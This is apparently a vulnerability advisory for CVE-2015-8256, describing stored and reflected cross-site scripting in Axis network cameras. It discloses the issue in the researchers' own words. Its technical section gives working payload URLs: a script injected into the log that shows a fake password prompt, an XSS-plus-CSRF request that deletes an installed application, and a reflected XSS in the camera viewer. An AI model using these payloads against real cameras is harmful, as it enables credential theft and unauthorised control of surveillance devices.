I. ADVISORY INFORMATION
-----------------------
Title: Axis Network Cameras Multiple Cross-site scripting
Vendor: Axis Communications
Class: Improper Input Validation [CWE-20]
CVE Name: CVE-2015-8256
Remotely Exploitable: Yes
Locally Exploitable: No
OLSA-ID: OLSA-2015-8256
Adivisory URL:
http://www.orwelllabs.com/2016/01/axis-network-cameras-multiple-cross.html


II. Background
--------------
Axis is the market leader in network video, invented the world’s first
network camera back in 1996 and we’ve been innovators in video surveillance
ever since. Axis network video products are installed in public places and
areas such as retail chains, airports, trains, motorways, universities,
prisons, casinos and banks.

III. vulnerability
------------------
AXIS Network Cameras are prone to multiple (stored/reflected) cross-site
scripting vulnerability.

IV. technical details
---------------------
These attack vectors allow you to execute an arbitrary javascript code in
the user browser (session) with this steps:

# 1 Attacker injects a javascript payload in the vulnerable page:
http://{axishost}/axis-cgi/vaconfig.cgi?action=get&name=<script
type="text/javascript>prompt("AXIS_PASSWORD:")</script>

This will create a entry in the genneral log file (/var/log/messages) So,
when the user is viewing the log 'system options' -> 'support' -> 'Logs &
Reports':

http://{axishost}/axis-cgi/admin/systemlog.cgi?id
will be displayed a prompt for the password of the current user
('AXIS_PASSWORD').

However, due to CSRF presented is even possible to perform all actions
already presented: create, edit and remove users and applications, etc. For
example, to delete an application "axis_update" via SXSS:

http://{axishost}/axis-cgi/vaconfig.cgi?action=get&name=<script src="http://
axishost/axis-cgi/admin/local_del.cgi?+/usr/html/local/viewer/axis_update.shtml"></script>

* A reflected cross-site scripting affects all models of AXIS devices on
the same parameter:
http://
{axis-cam-model}/view/view.shtml?imagePath=0WLL</script><script>alert('AXIS-XSS')</script><!--
